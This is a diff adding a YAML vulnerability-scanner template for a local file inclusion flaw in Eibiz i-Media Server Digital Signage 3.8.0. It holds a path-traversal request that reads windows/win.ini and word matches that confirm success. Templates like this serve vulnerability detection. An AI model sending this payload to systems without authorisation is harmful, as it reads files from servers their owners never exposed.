@@ -1,0 +1,25 @@
+id: eibiz-lfi
+brief:
+    title: Eibiz i-Media Server Digital Signage 3.8.0 - Local File Inclusion
+    by: 0x_akoko
+    level: high
+    about: Eibiz i-Media Server Digital Signage 3.8.0 is vulnerable to local file inclusion. An unauthenticated remote attacker can exploit this to view the contents of files located outside of the server's r...
+    label:
+        - lfi
+        - eibiz
+        - packetstorm
+        - windows
+        - vuln
+    score: CVSS:7.5
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/dlibrary/null?oldfile=../../../../../../windows/win.ini&library=null'
+      signs:
+        - "on": word
+          has:
+            - bit app support
+            - fonts
+            - extensions
+          in: body
+          need: all
